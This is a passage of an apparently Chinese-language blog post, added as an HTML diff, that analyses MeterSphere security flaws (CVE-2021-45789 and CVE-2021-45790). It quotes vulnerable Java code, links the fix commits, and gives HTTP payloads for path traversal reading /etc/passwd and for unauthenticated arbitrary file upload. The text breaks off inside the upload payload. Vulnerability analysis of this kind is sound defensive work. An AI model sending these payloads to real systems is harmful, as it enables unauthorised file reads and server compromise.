@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang=zh-CN>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        Metersphere项目安全漏洞概览 - undefined
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+
+    
+
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 常记常新 </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.jpg" />
+        </div>
+        <div class="name">
+            <i>LH</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li >
+                <a href="/collect/">
+                    <i class="iconfont icon-shoucang1"></i>
+                    <span>收藏</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE%E8%83%8C%E6%99%AF"><span class="toc-text">项目背景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F"><span class="toc-text">认证方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E"><span class="toc-text">历史漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2021-45789"><span class="toc-text">CVE-2021-45789</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E8%A1%A5%E4%B8%81"><span class="toc-text">修复补丁</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2021-45790"><span class="toc-text">CVE-2021-45790</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E8%A1%A5%E4%B8%81-1"><span class="toc-text">修复补丁</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">远程代码执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E8%A1%A5%E4%B8%81-2"><span class="toc-text">修复补丁</span></a></li></ol></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 常记常新 </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        Metersphere项目安全漏洞概览
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2022-02-09 11:16:44</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#漏洞分析" title="漏洞分析">漏洞分析</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#安全技术" title="安全技术">安全技术</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content no-indent">
+        <pre><code>本文首发于奇安信攻防社区:https://forum.butian.net/share/1185
+</code></pre>
+<p>最近爆出了一个metersphere的高危漏洞，一方面是对该漏洞的应急响应，另一方面对这个项目的历史漏洞也进行了一些了解和学习，因此写下此文对该项目安全相关及几个比较严重的漏洞的原理、利用及修复方法进行分析。</p>
+<h2 id="项目背景"><a href="#项目背景" class="headerlink" title="项目背景"></a>项目背景</h2><p>MeterSphere 是一站式开源持续测试平台，涵盖测试跟踪、接口测试、性能测试、 团队协作等功能，兼容 JMeter 等开源标准，有效助力开发和测试团队充分利用云弹性进行高度可扩展的自动化测试，加速高质量的软件交付，推动中国测试行业整体效率的提升。</p>
+<p>该项目没有类似于Apache那种专用的安全漏洞提交邮箱，因此该项目的安全漏洞一般是由漏洞发现者在GitHu提交Issue，缺点是漏洞的细节会被公开。</p>
+<p><img src="/img/metersphere/image_dkBpQUFsZV.png"></p>
+<h3 id="认证方式"><a href="#认证方式" class="headerlink" title="认证方式"></a>认证方式</h3><p>该项目基于Springboot+shiro进行路由和权限控制。metersphere项目使用shiro框架进行权限控制。相关的权限配置在<code>io.metersphere.config.ShiroConfig</code>和<code>io.metersphere.commons.utils.ShiroUtils</code>中。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//io.metersphere.config.ShiroConfig</span></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> ShiroFilterFactoryBean <span class="title function_">getShiroFilterFactoryBean</span><span class="params">(DefaultWebSecurityManager sessionManager)</span> &#123;</span><br><span class="line">    <span class="type">ShiroFilterFactoryBean</span> <span class="variable">shiroFilterFactoryBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();</span><br><span class="line">    shiroFilterFactoryBean.setLoginUrl(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">    shiroFilterFactoryBean.setSecurityManager(sessionManager);</span><br><span class="line">    shiroFilterFactoryBean.setUnauthorizedUrl(<span class="string">&quot;/403&quot;</span>);</span><br><span class="line">    shiroFilterFactoryBean.setSuccessUrl(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">    shiroFilterFactoryBean.getFilters().put(<span class="string">&quot;apikey&quot;</span>, <span class="keyword">new</span> <span class="title class_">ApiKeyFilter</span>());</span><br><span class="line">    shiroFilterFactoryBean.getFilters().put(<span class="string">&quot;csrf&quot;</span>, <span class="keyword">new</span> <span class="title class_">CsrfFilter</span>());</span><br><span class="line">    Map&lt;String, String&gt; filterChainDefinitionMap = shiroFilterFactoryBean.getFilterChainDefinitionMap();</span><br><span class="line"></span><br><span class="line">    ShiroUtils.loadBaseFilterChain(filterChainDefinitionMap);</span><br><span class="line"></span><br><span class="line">    ShiroUtils.ignoreCsrfFilter(filterChainDefinitionMap);</span><br><span class="line"></span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/**&quot;</span>, <span class="string">&quot;apikey, csrf, authc&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> shiroFilterFactoryBean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在shiroConfig中配置了默认所有路由都需要经过apikey、csrf、authc三个过滤器，其中authc就代表所有路径都需要认证。</p>
+<p>在ShiroUtils中，对不需要认证的路径及一些特殊的路径进行了认证配置。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">loadBaseFilterChain</span><span class="params">(Map&lt;String, String&gt; filterChainDefinitionMap)</span>&#123;</span><br><span class="line"></span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/resource/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/*.worker.js&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/login&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/signin&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/ldap/signin&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/ldap/open&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/signout&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/isLogin&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/css/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/js/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/img/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/fonts/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/display/info&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/favicon.ico&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/display/file/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/jmeter/download/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/jmeter/ping&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/jmeter/ready/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/authsource/list/allenable&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/sso/signin&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/sso/callback&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/license/valid&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/api/jmeter/download&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/api/jmeter/download/files&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/api/jmeter/download/jar&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/api/jmeter/download/plug/jar&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// for swagger</span></span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/swagger-ui.html&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/swagger-ui/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/v3/api-docs/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line"></span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/403&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/anonymous/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//分享相关接口</span></span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/share/info/generateShareInfoWithExpired&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/share/info/selectApiInfoByParam&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/share/get/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/share/info&quot;</span>, <span class="string">&quot;apikey, csrf, authc&quot;</span>); <span class="comment">// 需要认证</span></span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/document/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/share/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/sharePlanReport&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line"></span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/system/theme&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/system/save/baseurl/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/system/timeout&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line"></span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/v1/catalog/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/v1/agent/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/v1/health/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    <span class="comment">//mock接口</span></span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/mock/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/ws/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line"></span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/plugin/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h2><h3 id="CVE-2021-45789"><a href="#CVE-2021-45789" class="headerlink" title="CVE-2021-45789"></a>CVE-2021-45789</h3><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>这是一个任意文件上传漏洞，影响1.15.4及之前的版本，经过授权的攻击者可以利用下载功能读取目标主机上的任意文件。漏洞issue链接：<a target="_blank" rel="noopener" href="https://github.com/metersphere/metersphere/issues/8652" title="https://github.com/metersphere/metersphere/issues/8652">https://github.com/metersphere/metersphere/issues/8652</a></p>
+<p>issue中提到了漏洞的关键函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] loadFileAsBytes(FileOperationRequest fileOperationRequest) &#123;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(FileUtils.BODY_FILE_DIR + <span class="string">&quot;/&quot;</span> + fileOperationRequest.getId() + <span class="string">&quot;_&quot;</span> + fileOperationRequest.getName());</span><br><span class="line">    <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">         <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>(<span class="number">1000</span>);) &#123;</span><br><span class="line">        <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1000</span>];</span><br><span class="line">        <span class="type">int</span> n;</span><br><span class="line">        <span class="keyword">while</span> ((n = fis.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            bos.write(b, <span class="number">0</span>, n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        LogUtil.error(ex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到函数从fileOperationRequest中读取id和name并拼接进File对象，未进行任何的过滤就进行了文件读取。往前回溯，看哪里引用了这个函数，并关注fileOperationRequest变量是否用户可控。很快可以在<code>io.metersphere.api.controller.ApiAutomationController</code>中找到download函数，对该方法进行了调用。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/file/download&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;<span class="type">byte</span>[]&gt; download(<span class="meta">@RequestBody</span> FileOperationRequest fileOperationRequest) &#123;</span><br><span class="line">    <span class="type">byte</span>[] bytes = apiAutomationService.loadFileAsBytes(fileOperationRequest);</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.ok()</span><br><span class="line">            .contentType(MediaType.parseMediaType(<span class="string">&quot;application/octet-stream&quot;</span>))</span><br><span class="line">            .header(HttpHeaders.CONTENT_DISPOSITION, <span class="string">&quot;attachment; filename=\&quot;&quot;</span> + fileOperationRequest.getName() + <span class="string">&quot;\&quot;&quot;</span>)</span><br><span class="line">            .body(bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>metersphere后端基于springboot开发，这个函数对应的就是&#x2F;api&#x2F;automation&#x2F;file&#x2F;download路由，并且fileOperationRequest直接来源于用户输入，同时有RequestBody注解，可以使用json或者xml格式的HTTP请求体进行数据的输入。</p>
+<p>因此可以构建如下payload读取&#x2F;etc&#x2F;passwd文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /api/automation/file/download HTTP/<span class="number">1.1</span></span><br><span class="line">Host: host.com</span><br><span class="line">Cookie: COOKIE</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;../../../etc/passwd&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的&#x2F;api&#x2F;automation路径属于需要认证的路径，因此该漏洞利用需要授权。</p>
+<h4 id="修复补丁"><a href="#修复补丁" class="headerlink" title="修复补丁"></a>修复补丁</h4><p>GitHub 补丁commit：<a target="_blank" rel="noopener" href="https://github.com/metersphere/metersphere/commit/18c62d91f8e0ad5b1f5730a757c5a195eb0f0723" title="https://github.com/metersphere/metersphere/commit/18c62d91f8e0ad5b1f5730a757c5a195eb0f0723">https://github.com/metersphere/metersphere/commit/18c62d91f8e0ad5b1f5730a757c5a195eb0f0723</a></p>
+<p><img src="/img/metersphere/image_yNs7KXaWMX.png"></p>
+<p>在读取文件函数中增加了过滤，不允许<code>/</code>出现。</p>
+<h3 id="CVE-2021-45790"><a href="#CVE-2021-45790" class="headerlink" title="CVE-2021-45790"></a>CVE-2021-45790</h3><h4 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>这是一个任意文件上传漏洞，影响v.1.15.4及以前的版本，无需授权的攻击者可以利用该漏洞上传任意文件，并且可能造成任意命令执行。漏洞issue链接：<a target="_blank" rel="noopener" href="https://github.com/metersphere/metersphere/issues/8653" title="https://github.com/metersphere/metersphere/issues/8653">https://github.com/metersphere/metersphere/issues/8653</a></p>
+<p>漏洞作者同样贴出了触发漏洞的关键代码，在io.metersphere.service.ResourceService中：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">mdUpload</span><span class="params">(MdUploadRequest request, MultipartFile file)</span> &#123;</span><br><span class="line">    FileUtils.uploadFile(file, FileUtils.MD_IMAGE_DIR, request.getId() + <span class="string">&quot;_&quot;</span> + request.getFileName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数从名字来看，功能可能是上传markdown文件，但是可以看见，该函数中并未对文件的后缀有任何的限制，再看FileUtils.uploadFile函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">uploadFile</span><span class="params">(MultipartFile uploadFile, String path, String name)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (uploadFile == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">File</span> <span class="variable">testDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">    <span class="keyword">if</span> (!testDir.exists()) &#123;</span><br><span class="line">        testDir.mkdirs();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> testDir + <span class="string">&quot;/&quot;</span> + name;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filePath);</span><br><span class="line">    <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> uploadFile.getInputStream(); <span class="type">OutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file)) &#123;</span><br><span class="line">        file.createNewFile();</span><br><span class="line">        FileUtil.copyStream(in, out);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        LogUtil.error(e.getMessage(), e);</span><br><span class="line">        MSException.throwException(Translator.get(<span class="string">&quot;upload_fail&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> filePath;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样没有做任何过滤。接着向前回溯，看哪里调用了<code>mdUpload</code>函数，同样很快就可以找到io.metersphere.controller.ResourceController中的调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Resource</span></span><br><span class="line">ResourceService resourceService;</span><br><span class="line"><span class="meta">@PostMapping(value = &quot;/md/upload&quot;, consumes = &#123;&quot;multipart/form-data&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">upload</span><span class="params">(<span class="meta">@RequestPart(value = &quot;request&quot;)</span> MdUploadRequest request, <span class="meta">@RequestPart(value = &quot;file&quot;, required = false)</span> MultipartFile file)</span> &#123;</span><br><span class="line">    resourceService.mdUpload(request, file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>同样是未做任何过滤，直接就进行了函数调用。并且该函数属于<code>/resource</code>路由，该路由属于可以匿名访问的路由。</p>
+<p>因此可以使用如下格式的payload上传文件：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /resource/md/upload HTTP/<span class="number">1.1</span></span><br><span class="line">Host: host.com</span><br><span class="line">Content-Type: multipart/form-data;boundary=xxx</span><br><span class="line"></span><br><span class="line">--xxx</span><br><span class="line">Content-Disposition: form-data;name=<span class="string">&quot;file&quot;</span>; fileName=<span class="string">&quot;test&quot;</span></span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line"><span class="number">123</span></span><br><span class="line">--xxx</span><br><span class="line">Content-Disposition: form-data;name=<span class="string">&quot;request&quot;</span>; fileName=<span class="string">&quot;xxx&quot;</span></span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;../&quot;</span>,<span class="string">&quot;fileName&quot;</span>:<span class="string">&quot;../../tmp/test&quot;</span>&#125;</span><br><span class="line">--xxx--</span><br><span 